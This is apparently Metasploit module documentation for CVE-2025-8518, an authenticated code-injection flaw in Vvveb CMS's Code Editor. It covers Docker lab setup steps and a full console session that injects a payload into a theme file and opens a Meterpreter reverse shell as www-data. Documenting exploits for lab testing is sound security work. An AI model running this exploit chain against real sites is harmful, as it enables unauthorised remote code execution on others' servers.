## Vulnerable Application

[Vvveb CMS](https://github.com/givanz/Vvveb) is vulnerable to code injection via the Code Editor functionality.

Unsanitized editing functionality allows attacker-controlled changes to existing files on the web-accessible filesystem, 
allowing remote authenticated attackers with access to the Code Editor to achieve code execution 
when those modified files are executed or served by the application or web server.

This vulnerability affects Vvveb CMS versions up to and including 1.0.5.
Successful exploitation may result in the remote code execution under the privileges
of the web server, potentially exposing sensitive data or disrupting survey operations.

An attacker can execute arbitrary system commands in the context of the user running the web server.

## Testing

1. Open `data/exploits/CVE-2025-8518` folder and use Docker Compose to set up the Vvveb CMS app

`docker compose up -d --build`

2. Open http://127.0.0.1:8080/ and make sure the app is available

3. Fill in the installation form with the following details:

Database engine: MySQL / MariaDB
Database host: mysql
Database name: vvveb
Database username: root
Database password: root

4. On the next form, you need to enter the admin password or provide your own.

5. Log in with your credentials at http://127.0.0.1:8080/admin
Username: admin 
Password: the one you provided in the previous step

## Scenario

### php/meterpreter/reverse_tcp

```
msf6 > use multi/http/vvveb_auth_rce_cve_2025_8518
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/vvveb_auth_rce_cve_2025_8518) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/vvveb_auth_rce_cve_2025_8518) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/vvveb_auth_rce_cve_2025_8518) > set PASSWORD 12345
PASSWORD => 12345
msf6 exploit(multi/http/vvveb_auth_rce_cve_2025_8518) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf6 exploit(multi/http/vvveb_auth_rce_cve_2025_8518) > run verbose=true

[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Fetching CSRF token...
[+] Token successfully fetched: 
[*] Attempting login...
[+] Login successful
[*] Checking version...
[+] The target appears to be vulnerable. Detected version 1.0.5, which is vulnerable
[*] Identifying the active theme path...
[+] Theme path successfully identified: /public/themes/blog-default/theme.php
[*] Setting up payload...
[+] Payload setup complete
[*] Triggering payload...
[*] Sending stage (40004 bytes) to 172.24.0.3
[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.24.0.3:59256) at 2025-10-18 20:08:08 -0400

meterpreter > sysinfo
Computer    : 0c6eb9a3e896
OS          : Linux 0c6eb9a3e896 6.11.2-amd64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data
```